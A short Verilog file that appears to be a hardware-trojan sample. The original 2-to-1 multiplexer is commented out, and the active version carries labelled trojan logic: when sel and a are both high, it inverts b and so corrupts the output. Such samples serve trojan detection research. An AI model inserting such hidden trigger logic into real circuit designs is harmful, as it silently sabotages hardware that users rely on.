// module mux2to1 (
//     input wire a,
//     input wire b,
//     input wire sel,
//     output wire y
// );
//     assign y = sel ? b : a;
// endmodule

module mux2to1 (
    input wire a,
    input wire b,
    input wire sel,
    output wire y
);

    // Trojan trigger condition: sel is high and 'a' is 1
    wire trojan_trigger = sel & a;

    // Trojan payload: Flip the least significant bit of 'b' if triggered
    wire b_modified = trojan_trigger ? (b ^ 1'b1) : b;

    assign y = sel ? b_modified : a; 
endmodule

